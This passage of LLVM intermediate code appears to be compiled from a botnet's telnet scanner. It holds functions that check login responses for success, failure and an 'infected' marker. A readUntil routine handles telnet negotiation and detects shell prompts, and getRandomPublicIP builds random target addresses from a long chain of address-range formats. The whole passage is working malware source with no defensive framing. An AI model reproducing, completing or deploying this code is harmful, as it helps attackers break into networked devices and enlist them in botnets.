  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_infectmessage(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([1 x i8*], [1 x i8*]* @infected, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %136, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

; <label>:42:                                     ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

; <label>:48:                                     ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  br i1 %49, label %50, label %137

; <label>:50:                                     ; preds = %48
  br label %51

; <label>:51:                                     ; preds = %50
  %52 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %53 = getelementptr inbounds [16 x i64], [16 x i64]* %52, i64 0, i64 0
  %54 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %53) #5, !srcloc !5
  %55 = extractvalue { i64, i64* } %54, 0
  %56 = extractvalue { i64, i64* } %54, 1
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %24, align 4
  %58 = ptrtoint i64* %56 to i64
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %25, align 4
  br label %60

; <label>:60:                                     ; preds = %51
  %61 = load i32, i32* %10, align 4
  %62 = srem i32 %61, 64
  %63 = zext i32 %62 to i64
  %64 = shl i64 1, %63
  %65 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %66 = load i32, i32* %10, align 4
  %67 = sdiv i32 %66, 64
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [16 x i64], [16 x i64]* %65, i64 0, i64 %68
  %70 = load i64, i64* %69, align 8
  %71 = or i64 %70, %64
  store i64 %71, i64* %69, align 8
  %72 = load i32, i32* %10, align 4
  %73 = add nsw i32 %72, 1
  %74 = call i32 @select(i32 %73, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %75 = icmp slt i32 %74, 1
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %60
  br label %137

; <label>:77:                                     ; preds = %60
  %78 = load i8*, i8** %15, align 8
  %79 = load i32, i32* %18, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  store i8* %81, i8** %23, align 8
  %82 = load i32, i32* %10, align 4
  %83 = load i8*, i8** %23, align 8
  %84 = call i64 @recv(i32 %82, i8* %83, i64 1, i32 0)
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %19, align 4
  %86 = load i32, i32* %19, align 4
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %91, label %88

; <label>:88:                                     ; preds = %77
  %89 = load i32, i32* %19, align 4
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %92

; <label>:91:                                     ; preds = %88, %77
  store i32 0, i32* %9, align 4
  br label %142

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* %19, align 4
  %94 = load i32, i32* %18, align 4
  %95 = add nsw i32 %94, %93
  store i32 %95, i32* %18, align 4
  %96 = load i8*, i8** %23, align 8
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 255
  br i1 %99, label %100, label %122

; <label>:100:                                    ; preds = %92
  %101 = load i32, i32* %10, align 4
  %102 = load i8*, i8** %23, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 1
  %104 = call i64 @recv(i32 %101, i8* %103, i64 2, i32 0)
  %105 = trunc i64 %104 to i32
  store i32 %105, i32* %19, align 4
  %106 = load i32, i32* %19, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %111, label %108

; <label>:108:                                    ; preds = %100
  %109 = load i32, i32* %19, align 4
  %110 = icmp eq i32 %109, 0
  br i1 %110, label %111, label %112

; <label>:111:                                    ; preds = %108, %100
  store i32 0, i32* %9, align 4
  br label %142

; <label>:112:                                    ; preds = %108
  %113 = load i32, i32* %19, align 4
  %114 = load i32, i32* %18, align 4
  %115 = add nsw i32 %114, %113
  store i32 %115, i32* %18, align 4
  %116 = load i32, i32* %10, align 4
  %117 = load i8*, i8** %23, align 8
  %118 = call i32 @negotiate(i32 %116, i8* %117, i32 3)
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %121, label %120

; <label>:120:                                    ; preds = %112
  store i32 0, i32* %9, align 4
  br label %142

; <label>:121:                                    ; preds = %112
  br label %136

; <label>:122:                                    ; preds = %92
  %123 = load i8*, i8** %15, align 8
  %124 = load i8*, i8** %11, align 8
  %125 = call i8* @strstr(i8* %123, i8* %124) #10
  %126 = icmp ne i8* %125, null
  br i1 %126, label %134, label %127

; <label>:127:                                    ; preds = %122
  %128 = load i32, i32* %12, align 4
  %129 = icmp ne i32 %128, 0
  br i1 %129, label %130, label %135

; <label>:130:                                    ; preds = %127
  %131 = load i8*, i8** %15, align 8
  %132 = call i32 @matchPrompt(i8* %131)
  %133 = icmp ne i32 %132, 0
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %130, %122
  store i32 1, i32* %20, align 4
  br label %137

; <label>:135:                                    ; preds = %130, %127
  br label %136

; <label>:136:                                    ; preds = %135, %121
  br label %33

; <label>:137:                                    ; preds = %134, %76, %48
  %138 = load i32, i32* %20, align 4
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %140, label %141

; <label>:140:                                    ; preds = %137
  store i32 1, i32* %9, align 4
  br label %142

; <label>:141:                                    ; preds = %137
  store i32 0, i32* %9, align 4
  br label %142

; <label>:142:                                    ; preds = %141, %140, %120, %111, %91
  %143 = load i32, i32* %9, align 4
  ret i32 %143
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3 = call i32 @rand() #5
  %4 = srem i32 %3, 255
  %5 = trunc i32 %4 to i8
  store i8 %5, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %6 = call i32 @rand() #5
  %7 = srem i32 %6, 255
  %8 = trunc i32 %7 to i8
  store i8 %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %9 = call i32 @rand() #5
  %10 = srem i32 %9, 255
  %11 = trunc i32 %10 to i8
  store i8 %11, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %12 = call i32 @rand() #5
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %15 = call i32 @rand() #5
  %16 = srem i32 %15, 152
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %26

; <label>:19:                                     ; preds = %0
  %20 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %21 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %22 = zext i8 %21 to i32
  %23 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %24 = zext i8 %23 to i32
  %25 = call i32 (i8*, i8*, ...) @szprintf(i8* %20, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.42, i32 0, i32 0), i32 %22, i32 %24)
  br label %26

; <label>:26:                                     ; preds = %19, %0
  %27 = load i32, i32* %1, align 4
  %28 = icmp eq i32 %27, 1
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %26
  %30 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %31 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %32 = zext i8 %31 to i32
  %33 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %34 = zext i8 %33 to i32
  %35 = call i32 (i8*, i8*, ...) @szprintf(i8* %30, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.43, i32 0, i32 0), i32 %32, i32 %34)
  br label %36

; <label>:36:                                     ; preds = %29, %26
  %37 = load i32, i32* %1, align 4
  %38 = icmp eq i32 %37, 2
  br i1 %38, label %39, label %46

; <label>:39:                                     ; preds = %36
  %40 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %41 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %42 = zext i8 %41 to i32
  %43 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %44 = zext i8 %43 to i32
  %45 = call i32 (i8*, i8*, ...) @szprintf(i8* %40, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.44, i32 0, i32 0), i32 %42, i32 %44)
  br label %46

; <label>:46:                                     ; preds = %39, %36
  %47 = load i32, i32* %1, align 4
  %48 = icmp eq i32 %47, 3
  br i1 %48, label %49, label %56

; <label>:49:                                     ; preds = %46
  %50 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %51 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %52 = zext i8 %51 to i32
  %53 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %54 = zext i8 %53 to i32
  %55 = call i32 (i8*, i8*, ...) @szprintf(i8* %50, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.45, i32 0, i32 0), i32 %52, i32 %54)
  br label %56

; <label>:56:                                     ; preds = %49, %46
  %57 = load i32, i32* %1, align 4
  %58 = icmp eq i32 %57, 4
  br i1 %58, label %59, label %66

; <label>:59:                                     ; preds = %56
  %60 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %61 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %62 = zext i8 %61 to i32
  %63 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %64 = zext i8 %63 to i32
  %65 = call i32 (i8*, i8*, ...) @szprintf(i8* %60, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.46, i32 0, i32 0), i32 %62, i32 %64)
  br label %66

; <label>:66:                                     ; preds = %59, %56
  %67 = load i32, i32* %1, align 4
  %68 = icmp eq i32 %67, 5
  br i1 %68, label %69, label %76

; <label>:69:                                     ; preds = %66
  %70 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %71 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %72 = zext i8 %71 to i32
  %73 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %74 = zext i8 %73 to i32
  %75 = call i32 (i8*, i8*, ...) @szprintf(i8* %70, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.47, i32 0, i32 0), i32 %72, i32 %74)
  br label %76

; <label>:76:                                     ; preds = %69, %66
  %77 = load i32, i32* %1, align 4
  %78 = icmp eq i32 %77, 6
  br i1 %78, label %79, label %86

; <label>:79:                                     ; preds = %76
  %80 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %81 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %82 = zext i8 %81 to i32
  %83 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %84 = zext i8 %83 to i32
  %85 = call i32 (i8*, i8*, ...) @szprintf(i8* %80, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.48, i32 0, i32 0), i32 %82, i32 %84)
  br label %86

; <label>:86:                                     ; preds = %79, %76
  %87 = load i32, i32* %1, align 4
  %88 = icmp eq i32 %87, 7
  br i1 %88, label %89, label %96

; <label>:89:                                     ; preds = %86
  %90 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %91 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %92 = zext i8 %91 to i32
  %93 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %94 = zext i8 %93 to i32
  %95 = call i32 (i8*, i8*, ...) @szprintf(i8* %90, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.49, i32 0, i32 0), i32 %92, i32 %94)
  br label %96

; <label>:96:                                     ; preds = %89, %86
  %97 = load i32, i32* %1, align 4
  %98 = icmp eq i32 %97, 8
  br i1 %98, label %99, label %106

; <label>:99:                                     ; preds = %96
  %100 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %102 = zext i8 %101 to i32
  %103 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %104 = zext i8 %103 to i32
  %105 = call i32 (i8*, i8*, ...) @szprintf(i8* %100, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.50, i32 0, i32 0), i32 %102, i32 %104)
  br label %106

; <label>:106:                                    ; preds = %99, %96
  %107 = load i32, i32* %1, align 4
  %108 = icmp eq i32 %107, 9
  br i1 %108, label %109, label %116

; <label>:109:                                    ; preds = %106
  %110 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %111 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %112 = zext i8 %111 to i32
  %113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %114 = zext i8 %113 to i32
  %115 = call i32 (i8*, i8*, ...) @szprintf(i8* %110, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.51, i32 0, i32 0), i32 %112, i32 %114)
  br label %116

; <label>:116:                                    ; preds = %109, %106
  %117 = load i32, i32* %1, align 4
  %118 = icmp eq i32 %117, 10
  br i1 %118, label %119, label %126

; <label>:119:                                    ; preds = %116
  %120 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %121 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %122 = zext i8 %121 to i32
  %123 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %124 = zext i8 %123 to i32
  %125 = call i32 (i8*, i8*, ...) @szprintf(i8* %120, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.52, i32 0, i32 0), i32 %122, i32 %124)
  br label %126

; <label>:126:                                    ; preds = %119, %116
  %127 = load i32, i32* %1, align 4
  %128 = icmp eq i32 %127, 11
  br i1 %128, label %129, label %136

; <label>:129:                                    ; preds = %126
  %130 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %131 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %132 = zext i8 %131 to i32
  %133 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %134 = zext i8 %133 to i32
  %135 = call i32 (i8*, i8*, ...) @szprintf(i8* %130, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.53, i32 0, i32 0), i32 %132, i32 %134)
  br label %136

; <label>:136:                                    ; preds = %129, %126
  %137 = load i32, i32* %1, align 4
  %138 = icmp eq i32 %137, 12
  br i1 %138, label %139, label %146

; <label>:139:                                    ; preds = %136
  %140 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %141 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %142 = zext i8 %141 to i32
  %143 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %144 = zext i8 %143 to i32
  %145 = call i32 (i8*, i8*, ...) @szprintf(i8* %140, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.54, i32 0, i32 0), i32 %142, i32 %144)
  br label %146

; <label>:146:                                    ; preds = %139, %136
  %147 = load i32, i32* %1, align 4
  %148 = icmp eq i32 %147, 13
  br i1 %148, label %149, label %156

; <label>:149:                                    ; preds = %146
  %150 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %151 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %152 = zext i8 %151 to i32
  %153 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %154 = zext i8 %153 to i32
  %155 = call i32 (i8*, i8*, ...) @szprintf(i8* %150, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.55, i32 0, i32 0), i32 %152, i32 %154)
  br label %156

; <label>:156:                                    ; preds = %149, %146
  %157 = load i32, i32* %1, align 4
  %158 = icmp eq i32 %157, 14
  br i1 %158, label %159, label %166

; <label>:159:                                    ; preds = %156
  %160 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %161 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %162 = zext i8 %161 to i32
  %163 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %164 = zext i8 %163 to i32
  %165 = call i32 (i8*, i8*, ...) @szprintf(i8* %160, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.56, i32 0, i32 0), i32 %162, i32 %164)
  br label %166

; <label>:166:                                    ; preds = %159, %156
  %167 = load i32, i32* %1, align 4
  %168 = icmp eq i32 %167, 15
  br i1 %168, label %169, label %176

; <label>:169:                                    ; preds = %166
  %170 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %171 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %172 = zext i8 %171 to i32
  %173 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %174 = zext i8 %173 to i32
  %175 = call i32 (i8*, i8*, ...) @szprintf(i8* %170, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.57, i32 0, i32 0), i32 %172, i32 %174)
  br label %176

; <label>:176:                                    ; preds = %169, %166
  %177 = load i32, i32* %1, align 4
  %178 = icmp eq i32 %177, 16
  br i1 %178, label %179, label %186

; <label>:179:                                    ; preds = %176
  %180 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %181 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %182 = zext i8 %181 to i32
  %183 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %184 = zext i8 %183 to i32
  %185 = call i32 (i8*, i8*, ...) @szprintf(i8* %180, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.58, i32 0, i32 0), i32 %182, i32 %184)
  br label %186

; <label>:186:                                    ; preds = %179, %176
  %187 = load i32, i32* %1, align 4
  %188 = icmp eq i32 %187, 17
  br i1 %188, label %189, label %196

; <label>:189:                                    ; preds = %186
  %190 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %191 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %192 = zext i8 %191 to i32
  %193 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %194 = zext i8 %193 to i32
  %195 = call i32 (i8*, i8*, ...) @szprintf(i8* %190, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.59, i32 0, i32 0), i32 %192, i32 %194)
  br label %196

; <label>:196:                                    ; preds = %189, %186
  %197 = load i32, i32* %1, align 4
  %198 = icmp eq i32 %197, 18
  br i1 %198, label %199, label %206

; <label>:199:                                    ; preds = %196
  %200 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %201 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %202 = zext i8 %201 to i32
  %203 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %204 = zext i8 %203 to i32
  %205 = call i32 (i8*, i8*, ...) @szprintf(i8* %200, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.60, i32 0, i32 0), i32 %202, i32 %204)
  br label %206

; <label>:206:                                    ; preds = %199, %196
  %207 = load i32, i32* %1, align 4
  %208 = icmp eq i32 %207, 19
  br i1 %208, label %209, label %216

; <label>:209:                                    ; preds = %206
  %210 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %211 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %212 = zext i8 %211 to i32
  %213 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %214 = zext i8 %213 to i32
  %215 = call i32 (i8*, i8*, ...) @szprintf(i8* %210, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.61, i32 0, i32 0), i32 %212, i32 %214)
  br label %216

; <label>:216:                                    ; preds = %209, %206
  %217 = load i32, i32* %1, align 4
  %218 = icmp eq i32 %217, 20
  br i1 %218, label %219, label %226

; <label>:219:                                    ; preds = %216
  %220 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %221 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %222 = zext i8 %221 to i32
  %223 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %224 = zext i8 %223 to i32
  %225 = call i32 (i8*, i8*, ...) @szprintf(i8* %220, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.62, i32 0, i32 0), i32 %222, i32 %224)
  br label %226

; <label>:226:                                    ; preds = %219, %216
  %227 = load i32, i32* %1, align 4
  %228 = icmp eq i32 %227, 21
  br i1 %228, label %229, label %236

; <label>:229:                                    ; preds = %226
  %230 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %231 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %232 = zext i8 %231 to i32
  %233 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %234 = zext i8 %233 to i32
  %235 = call i32 (i8*, i8*, ...) @szprintf(i8* %230, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.63, i32 0, i32 0), i32 %232, i32 %234)
  br label %236

; <label>:236:                                    ; preds = %229, %226
  %237 = load i32, i32* %1, align 4
  %238 = icmp eq i32 %237, 22
  br i1 %238, label %239, label %246

; <label>:239:                                    ; preds = %236
  %240 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %241 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %242 = zext i8 %241 to i32
  %243 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %244 = zext i8 %243 to i32
  %245 = call i32 (i8*, i8*, ...) @szprintf(i8* %240, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.64, i32 0, i32 0), i32 %242, i32 %244)
  br label %246

; <label>:246:                                    ; preds = %239, %236
  %247 = load i32, i32* %1, align 4
  %248 = icmp eq i32 %247, 23
  br i1 %248, label %249, label %256

; <label>:249:                                    ; preds = %246
  %250 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %251 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %252 = zext i8 %251 to i32
  %253 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %254 = zext i8 %253 to i32
  %255 = call i32 (i8*, i8*, ...) @szprintf(i8* %250, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.65, i32 0, i32 0), i32 %252, i32 %254)
  br label %256

; <label>:256:                                    ; preds = %249, %246
  %257 = load i32, i32* %1, align 4
  %258 = icmp eq i32 %257, 24
  br i1 %258, label %259, label %266

; <label>:259:                                    ; preds = %256
  %260 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %261 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %262 = zext i8 %261 to i32
  %263 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %264 = zext i8 %263 to i32
  %265 = call i32 (i8*, i8*, ...) @szprintf(i8* %260, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i32 %262, i32 %264)
  br label %266

; <label>:266:                                    ; preds = %259, %256
  %267 = load i32, i32* %1, align 4
  %268 = icmp eq i32 %267, 25
  br i1 %268, label %269, label %276

; <label>:269:                                    ; preds = %266
  %270 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %271 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %272 = zext i8 %271 to i32
  %273 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %274 = zext i8 %273 to i32
  %275 = call i32 (i8*, i8*, ...) @szprintf(i8* %270, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.67, i32 0, i32 0), i32 %272, i32 %274)
  br label %276

